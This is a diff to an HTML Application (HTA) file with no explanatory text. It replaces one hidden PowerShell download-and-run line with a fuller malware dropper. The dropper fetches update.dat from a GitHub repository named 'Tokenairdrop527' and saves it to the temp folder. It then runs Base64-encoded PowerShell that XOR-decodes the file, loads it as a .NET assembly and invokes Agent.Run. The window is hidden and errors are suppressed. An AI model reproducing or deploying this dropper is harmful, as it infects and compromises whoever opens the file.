@@ -1,1 +1,18 @@
-<html><head><HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize"/><script language="VBScript">CreateObject("WScript.Shell").Run "powershell -ep bypass -nop -w 1 -c iex((iwr 'https://raw.githubusercontent.com/Tokenairdrop527/update/refs/heads/main/boot.ps1' -UseBasicParsing).Content)",0,False:close()</script></head><body></body></html>
+<html><head><HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize" CAPTION="no"/>
+<script language="VBScript">
+On Error Resume Next
+Dim http, st, ws, tmp
+tmp = Environ("TEMP") & "\msonl.dat"
+Set http = CreateObject("MSXML2.XMLHTTP.6.0")
+http.Open "GET", "https://raw.githubusercontent.com/Tokenairdrop527/update/refs/heads/main/update.dat", False
+http.Send
+Set st = CreateObject("ADODB.Stream")
+st.Type = 1
+st.Open
+st.Write http.responseBody
+st.SaveToFile tmp, 2
+st.Close
+Set ws = CreateObject("WScript.Shell")
+ws.Run "powershell -nop -w h -enc JABiAD0AWwBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABlAG4AdgA6AFQARQBNAFAAKwAnAFwAbQBzAG8AbgBsAC4AZABhAHQAJwApADsAJABkAD0AWwBiAHkAdABlAFsAXQBdACgAJABiAHwAJQB7ACQAXwAtAGIAeABvAHIAMAB4AEEARQB9ACkAOwBbAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoACQAZAApAC4ARwBlAHQAVAB5AHAAZQAoACcAQQBnAGUAbgB0ACcAKQAuAEcAZQB0AE0AZQB0AGgAbwBkACgAJwBSAHUAbgAnACkALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsACQAbgB1AGwAbAApAA==", 0, False
+self.close
+</script></head><body></body></html>
